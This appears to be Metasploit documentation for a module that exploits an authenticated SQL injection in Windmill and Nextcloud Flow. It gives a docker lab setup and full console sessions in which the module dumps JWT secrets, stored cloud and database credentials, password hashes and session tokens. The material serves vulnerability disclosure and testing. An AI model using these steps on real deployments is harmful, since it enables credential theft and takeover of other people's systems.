## Vulnerable Application

This module exploits a SQL injection vulnerability (CVE pending) in Windmill and Nextcloud Flow
to extract sensitive data from the PostgreSQL database.

The vulnerability exists in the folder `addowner` endpoint where the `owner` parameter is vulnerable to
JSONB path injection, allowing arbitrary SQL execution.

### Affected Versions

| Product            | Affected            | Fixed    |
|--------------------|---------------------|----------|
| Windmill           | v1.276.0 - v1.603.2 | v1.603.3 |
| Nextcloud Flow     | v1.0.0 - v1.2.2     | v1.3.0   |

### Requirements

- Valid Windmill credentials (any user, including low-privileged operators)
- The `addowner` endpoint requires folder ownership, but any authenticated user can create
  their own folder and automatically becomes its owner
- For Nextcloud Flow via proxy: **Nextcloud credentials required** (NC_USER/NC_PASS)

**Note:** Unlike path traversal, SQLi via proxy **REQUIRES Nextcloud credentials** because endpoints like
`/api/auth/login` and `/api/w/*/folders/*` are blocked without Nextcloud authentication.

### What Can Be Extracted

- **global_settings**: JWT secrets, SMTP credentials, OAuth configs, license keys, etc.
- **resources**: Database credentials, API keys, cloud credentials (AWS, GitHub, etc.)
- **users**: Email addresses, password hashes (argon2id), admin status
- **tokens**: API tokens and session tokens

## Lab Setup

### Windmill Standalone

Create `docker-compose.yml`:

```yaml
services:
  db:
    image: postgres:16
    restart: unless-stopped
    environment:
      POSTGRES_PASSWORD: changeme
      POSTGRES_DB: windmill
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres"]
      interval: 5s
      timeout: 5s
      retries: 10

  windmill_server:
    image: ghcr.io/windmill-labs/windmill:1.603.2
    restart: unless-stopped
    ports:
      - "8000:8000"
    environment:
      - DATABASE_URL=postgres://postgres:changeme@db/windmill?sslmode=disable
      - MODE=server
      - SUPERADMIN_SECRET=SuperSecretToken123!
    depends_on:
      db:
        condition: service_healthy
    volumes:
      - worker_logs:/tmp/windmill/logs

  windmill_worker:
    image: ghcr.io/windmill-labs/windmill:1.603.2
    restart: unless-stopped
    environment:
      - DATABASE_URL=postgres://postgres:changeme@db/windmill?sslmode=disable
      - MODE=worker
    depends_on:
      db:
        condition: service_healthy
    volumes:
      - worker_logs:/tmp/windmill/logs

  setup:
    image: curlimages/curl:latest
    depends_on:
      windmill_server:
        condition: service_healthy
    restart: "no"
    entrypoint: ["/bin/sh", "-c"]
    command:
      - |
        curl -s -X POST "http://windmill_server:8000/api/users/create" \
          -H "Authorization: Bearer SuperSecretToken123!" \
          -H "Content-Type: application/json" \
          -d '{"email":"operator@windmill.dev","password":"password123","super_admin":false,"name":"Operator"}' && \
        curl -s -X POST "http://windmill_server:8000/api/workspaces/create" \
          -H "Authorization: Bearer SuperSecretToken123!" \
          -H "Content-Type: application/json" \
          -d '{"id":"demo","name":"Demo Workspace"}' && \
        curl -s -X POST "http://windmill_server:8000/api/w/demo/workspaces/add_user" \
          -H "Authorization: Bearer SuperSecretToken123!" \
          -H "Content-Type: application/json" \
          -d '{"email":"operator@windmill.dev","is_admin":false,"operator":true}'

volumes:
  worker_logs:
```

```bash
docker compose up -d
```

Access: http://localhost:8000

**Default credentials:**
- Operator: `operator@windmill.dev` / `password123`
- Admin: `admin@windmill.dev` / `changeme`

**Insert test data for DUMP scenarios:**

```bash
DB_CONTAINER=$(docker ps --format '{{.Names}}' | grep -E 'windmill.*db' | head -1)

docker exec $DB_CONTAINER psql -U postgres -d windmill -c "
INSERT INTO global_settings (name, value) VALUES
  ('license_key', '\"WM-FAKE-LICENSE-KEY-12345\"'),
  ('scim_token', '\"scim_fake_token_abcdef123456\"'),
  ('hub_api_secret', '\"hub_secret_xyz789\"'),
  ('smtp_settings', '{\"host\":\"smtp.example.com\",\"port\":587,\"user\":\"admin@example.com\",\"password\":\"SmtpP@ssw0rd!\"}'),
  ('oauths', '{\"github\":{\"client_id\":\"gh_client_123\",\"client_secret\":\"gh_secret_456\"}}'),
  ('pip_index_url', '\"https://pypi.internal.corp/simple\"')
ON CONFLICT (name) DO UPDATE SET value = EXCLUDED.value;
"

docker exec $DB_CONTAINER psql -U postgres -d windmill -c "
INSERT INTO resource (workspace_id, path, value, description, resource_type) VALUES
  ('admins', 'u/admin/postgres_prod', '{\"host\":\"db.prod.internal\",\"port\":5432,\"dbname\":\"production\",\"user\":\"admin\",\"password\":\"SuperSecret123!\"}', 'Production DB', 'postgres'),
  ('admins', 'u/admin/aws_keys', '{\"access_key_id\":\"AKIAIOSFODNN7EXAMPLE\",\"secret_access_key\":\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"}', 'AWS creds', 'aws'),
  ('admins', 'u/admin/github_token', '{\"token\":\"ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"}', 'GitHub PAT', 'github')
ON CONFLICT (workspace_id, path) DO UPDATE SET value = EXCLUDED.value;
"
```

### Nextcloud Flow

**Prerequisites:** Add to `/etc/hosts`:
```bash
sudo sh -c 'echo "127.0.0.1 localhost.local" >> /etc/hosts'
```

Create directory structure:
```bash
mkdir -p nginx
```

Create `docker-compose.yml`:

```yaml
services:
  nextcloud-aio-mastercontainer:
    image: nextcloud/all-in-one:latest
    init: true
    restart: always
    container_name: nextcloud-aio-mastercontainer
    volumes:
      - nextcloud_aio_mastercontainer:/mnt/docker-aio-config
      - /var/run/docker.sock:/var/run/docker.sock:ro
    ports:
      - "8180:8080"
    environment:
      - APACHE_PORT=11000
      - APACHE_IP_BINDING=0.0.0.0
      - NEXTCLOUD_DATADIR=/mnt/ncdata
      - SKIP_DOMAIN_VALIDATION=true

  nginx-proxy:
    image: nginx:alpine
    container_name: nextcloud-nginx-proxy
    restart: always
    ports:
      - "443:443"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
      - ./nginx/ssl.crt:/etc/nginx/ssl/ssl.crt:ro
      - ./nginx/ssl.key:/etc/nginx/ssl/ssl.key:ro
    networks:
      - default
      - nextcloud-aio

volumes:
  nextcloud_aio_mastercontainer:
    name: nextcloud_aio_mastercontainer

networks:
  nextcloud-aio:
    name: nextcloud-aio
    external: true
```

Create `nginx/nginx.conf`:

```nginx
events {
    worker_connections 1024;
}

http {
    server {
        listen 443 ssl;
        server_name localhost.local;

        ssl_certificate /etc/nginx/ssl/ssl.crt;
        ssl_certificate_key /etc/nginx/ssl/ssl.key;

        location / {
            proxy_pass http://nextcloud-aio-apache:11000;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto https;
            proxy_set_header X-Forwarded-Port 443;
            proxy_buffering off;
            proxy_request_buffering off;
            client_max_body_size 0;
        }
    }
}
```

Generate self-signed SSL certificate:

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout nginx/ssl.key -out nginx/ssl.crt \
  -subj "/CN=localhost.local"
```

**Nextcloud AIO Configuration:**

1. `docker compose up -d`
2. Open **https://localhost:8180** (accept self-signed certificate)
3. Note the generated passphrase
4. Enter domain: **`localhost.local`**
5. In **Optional containers**, enable **Docker Socket Proxy**
6. Click **Submit** then **Start containers**
7. Wait for all containers to be "Running" (5-10 min)
8. Create network: `docker network create nextcloud-aio`
9. Connect nginx: `docker network connect nextcloud-aio nextcloud-nginx-proxy`
10. Restart nginx: `docker restart nextcloud-nginx-proxy`
11. Access Nextcloud: **https://localhost.local**
12. In Nextcloud → **Apps** → Search **"Flow"** → **Install**

**Insert test data for Flow DUMP scenarios:**

Flow has its own PostgreSQL inside the `nc_app_flow` container:

```bash
docker exec nc_app_flow psql -U flow -d flow -c "
INSERT INTO global_settings (name, value) VALUES
  ('license_key', '\"WM-FAKE-LICENSE-KEY-12345\"'),
  ('scim_token', '\"scim_fake_token_abcdef123456\"'),
  ('hub_api_secret', '\"hub_secret_xyz789\"'),
  ('smtp_settings', '{\"host\":\"smtp.example.com\",\"port\":587,\"user\":\"admin@example.com\",\"password\":\"SmtpP@ssw0rd!\"}'),
  ('oauths', '{\"github\":{\"client_id\":\"gh_client_123\",\"client_secret\":\"gh_secret_456\"}}'),
  ('pip_index_url', '\"https://pypi.internal.corp/simple\"')
ON CONFLICT (name) DO UPDATE SET value = EXCLUDED.value;
"

docker exec nc_app_flow psql -U flow -d flow -c "
INSERT INTO resource (workspace_id, path, value, description, resource_type) VALUES
  ('admins', 'u/admin/postgres_prod', '{\"host\":\"db.prod.internal\",\"port\":5432,\"dbname\":\"production\",\"user\":\"admin\",\"password\":\"SuperSecret123!\"}', 'Production DB', 'postgres'),
  ('admins', 'u/admin/aws_keys', '{\"access_key_id\":\"AKIAIOSFODNN7EXAMPLE\",\"secret_access_key\":\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"}', 'AWS creds', 'aws'),
  ('admins', 'u/admin/github_token', '{\"token\":\"ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"}', 'GitHub PAT', 'github')
ON CONFLICT (workspace_id, path) DO UPDATE SET value = EXCLUDED.value;
"
```

## Verification Steps

1. Start msfconsole
2. `use auxiliary/gather/windmill_sqli`
3. `set RHOSTS <target>`
4. `set RPORT <port>`
5. `set USERNAME <user>`
6. `set PASSWORD <password>`
7. `set ACTION <action>`
8. `run`

## Options

### USERNAME

A valid Windmill username (email). Can be any user including low-privileged operators.

### PASSWORD

Password for the specified user.

### NC_USER / NC_PASS

For Nextcloud Flow deployments via proxy, these options provide Nextcloud Basic authentication credentials.

**Required for SQLi via proxy!**

### SQL (for QUERY action)

Custom SQL expression to execute (e.g., `(SELECT version())`).

## Actions

### DUMP_SECRETS (default)

Dynamically extracts **all** settings from `global_settings` table, including custom settings.

Critical secrets are highlighted and stored as credentials:
- `jwt_secret` - JWT signing secret (for forging admin tokens)
- `license_key` - Windmill license key
- `scim_token` - SCIM provisioning token
- `hub_api_secret` - Hub API secret
- `powershell_repo_pat` - PowerShell repository PAT
- `oauths` - OAuth client secrets
- `smtp_settings` - SMTP credentials

Other settings (URLs, configs, custom) are also extracted and displayed.

### DUMP_RESOURCES

Dumps all resources (credentials, API keys, database connections) from the `resource` table.
This is often the most sensitive action as it extracts user-configured secrets like:
- Database credentials (PostgreSQL, MySQL, etc.)
- Cloud credentials (AWS access keys, GCP service accounts)
- API tokens (GitHub, Slack, etc.)

### DUMP_USERS

Dumps all users with their email, password hash (argon2id), super_admin status, and login type.

### DUMP_TOKENS

Dumps all API tokens with associated email and label.

### QUERY

Executes a custom SQL expression and returns the result.

## Scenarios

### DUMP_SECRETS - Extract All Settings Dynamically (Standalone)

```
msf6 > use auxiliary/gather/windmill_sqli
[*] Setting default action DUMP_SECRETS - view all 4 actions with the show actions command
msf6 auxiliary(gather/windmill_sqli) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(gather/windmill_sqli) > set RPORT 8000
RPORT => 8000
msf6 auxiliary(gather/windmill_sqli) > set USERNAME admin@windmill.dev
USERNAME => admin@windmill.dev
msf6 auxiliary(gather/windmill_sqli) > set PASSWORD changeme
PASSWORD => changeme
msf6 auxiliary(gather/windmill_sqli) > run
[*] Running module against 127.0.0.1
[*] Detected: Windmill Standalone
[*] Authenticated: admin@windmill.dev
[*] Dumping all global_settings...
[*] Found 14 setting(s)

[*] uid: 57403191-9c5f-4170-a22b-5a2c07a93ff9

[*] custom_tags: ["chromium"]

[*] automate_username_creation: true

[*] custom_instance_pg_databases: {"user_pwd"=>"183346c7-c628-450e-b715-ff8ecb3623b5", "databases"=>{}}

[+] jwt_secret: eFrsCwdkrNIMDNdmDe9nzXmDnU6Wznjx

[+] license_key: WM-FAKE-LICENSE-KEY-12345

[+] scim_token: scim_fake_token_abcdef123456

[+] hub_api_secret: hub_secret_xyz789

[+] smtp_settings: {"host"=>"smtp.example.com", "port"=>587, "user"=>"admin@example.com", "password"=>"SmtpP@ssw0rd!"}

[+] oauths: {"github"=>{"client_id"=>"gh_client_123", "client_secret"=>"gh_secret_456"}}

[*] pip_index_url: https://pypi.internal.corp/simple
[*] Auxiliary module execution completed
```

Critical secrets (highlighted with `[+]`) are automatically stored as credentials.

### DUMP_RESOURCES - Extract Credentials and API Keys

```
msf6 auxiliary(gather/windmill_sqli) > set ACTION DUMP_RESOURCES
ACTION => DUMP_RESOURCES
msf6 auxiliary(gather/windmill_sqli) > run
[*] Running module against 127.0.0.1
[*] Detected: Windmill Standalone
[*] Authenticated: admin@windmill.dev
[*] Dumping resources (credentials, API keys, DB connections...)...
[*] Found 5 resource(s)

[+] Resource: f/demo/internal_db
[*]   Workspace: demo
[*]   Type: postgresql
[*]   Value: {"host": "db", "port": 5432, "user": "postgres", "dbname": "windmill", "sslmode": "disable", "password": "changeme"}

[+] Resource: u/admin/postgres_prod
[*]   Workspace: admins
[*]   Type: postgres
[*]   Value: {"host": "db.prod.internal", "port": 5432, "user": "admin", "dbname": "production", "password": "SuperSecret123!"}

[+] Resource: u/admin/aws_keys
[*]   Workspace: admins
[*]   Type: aws
[*]   Value: {"access_key_id": "AKIAIOSFODNN7EXAMPLE", "secret_access_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}

[+] Resource: u/admin/github_token
[*]   Workspace: admins
[*]   Type: github
[*]   Value: {"token": "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"}
[*] Auxiliary module execution completed
```

### DUMP_USERS - Extract Users with Password Hashes

```
msf6 auxiliary(gather/windmill_sqli) > set ACTION DUMP_USERS
ACTION => DUMP_USERS
msf6 auxiliary(gather/windmill_sqli) > run
[*] Running module against 127.0.0.1
[*] Detected: Windmill Standalone
[*] Authenticated: admin@windmill.dev
[*] Dumping users with password hashes...
[*] Found 2 user(s)

[+] User: admin@windmill.dev
[*]   Hash: $argon2id$v=19$m=4096,t=3,p=1$oLJo/lPn/gezXCuFOEyaNw$i0T2tCkw3xUFsrBIKZwr8jVNHlIfoxQe+HfDnLtd12I
[*]   Super Admin: true
[*]   Login Type: password

[+] User: operator@windmill.dev
[*]   Hash: $argon2id$v=19$m=19456,t=2,p=1$/HiSNvByBPC1MNLTgvZqEw$5zmEzNunKwDVoqM0fBzNu9LYuCn7Eu8u/qQjtqQ/njw
[*]   Super Admin: false
[*]   Login Type: password
[*] Auxiliary module execution completed
```

### DUMP_TOKENS - Extract Session Tokens

```
msf6 auxiliary(gather/windmill_sqli) > set ACTION DUMP_TOKENS
ACTION => DUMP_TOKENS
msf6 auxiliary(gather/windmill_sqli) > run
[*] Running module against 127.0.0.1
[*] Detected: Windmill Standalone
[*] Authenticated: admin@windmill.dev
[*] Dumping tokens...
[*] Found 50 token(s)

[+] Token: U4W1AHonpoSKZ72zaGJaRuUStgZTupUv
[*]   Email: admin@windmill.dev
[*]   Label: session

[+] Token: 1TYikaOToCQ5x1ZbnXRtlsAt8qJI2Y60
[*]   Email: admin@windmill.dev
[*]   Label: session

[+] Token: 314M5kXm6fb4JTuhjk7P3zRh6Eyryr2K
[*]   Email: operator@windmill.dev
[*]   Label: session

... (more tokens) ...
[*] Auxiliary module execution completed
```

### QUERY - Custom SQL Expression

```
msf6 auxiliary(gather/windmill_sqli) > set ACTION QUERY
ACTION => QUERY
msf6 auxiliary(gather/windmill_sqli) > set SQL version()
SQL => version()
msf6 auxiliary(gather/windmill_sqli) > run
[*] Running module against 127.0.0.1
[*] Detected: Windmill Standalone
[*] Authenticated: admin@windmill.dev
[*] Executing: version()
[+] Result: PostgreSQL 16.11 (Debian 16.11-1.pgdg13+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit
[*] Auxiliary module execution completed
```

### QUERY - Database Name

```
msf6 auxiliary(gather/windmill_sqli) > set SQL current_database()
SQL => current_database()
msf6 auxiliary(gather/windmill_sqli) > run
[*] Running module against 127.0.0.1
[*] Detected: Windmill Standalone
[*] Authenticated: admin@windmill.dev
[*] Executing: current_database()
[+] Result: windmill
[*] Auxiliary module execution completed
```

### Low-Privileged Operator Exploitation

Even operators with minimal privileges can exploit this vulnerability:

```
msf6 auxiliary(gather/windmill_sqli) > set USERNAME operator@windmill.dev
USERNAME => operator@windmill.dev
msf6 auxiliary(gather/windmill_sqli) > set PASSWORD password123
PASSWORD => password123
msf6 auxiliary(gather/windmill_sqli) > set ACTION DUMP_SECRETS
ACTION => DUMP_SECRETS
msf6 auxiliary(gather/windmill_sqli) > run
[*] Running module against 127.0.0.1
[*] Detected: Windmill Standalone
[*] Authenticated: operator@windmill.dev
[*] Dumping secrets...
[+] jwt_secret: eFrsCwdkrNIMDNdmDe9nzXmDnU6Wznjx
[*] Auxiliary module execution completed
```

Use `exploit/linux/http/windmill_sqli_rce` for automatic privilege escalation to RCE.
